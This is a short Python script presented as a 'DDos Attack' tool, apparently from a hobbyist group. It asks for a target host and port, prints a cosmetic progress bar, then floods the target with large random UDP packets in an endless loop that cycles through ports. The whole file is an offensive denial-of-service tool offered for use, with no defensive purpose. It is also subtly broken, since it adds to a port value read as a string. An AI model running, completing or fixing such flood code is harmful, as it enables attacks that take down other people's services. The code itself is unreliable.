import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65534)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("\033[34mDiscord : @Z1#7872")
print("\033[35mTeam : Eyes")
print("\033[37mDDoS Tools By : ZieL\n")

ip = input("\033[37mHost/Ip \033[31m>>> \033[32m")
port = input("\033[37mPort    \033[31m>>> \033[32m")

os.system("clear")
os.system("figlet Attack Starting")
print("\033[91m[                    ] 0% ")
time.sleep(5)
print("\033[31m[=====               ] 25%")
time.sleep(5)
print("\033[93m[==========          ] 50%")
time.sleep(5)
print("\033[33m[===============     ] 75%")
time.sleep(5)
print("\033[92m[================    ] 85%")
time.sleep(5)
print("\033[32m[====================] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1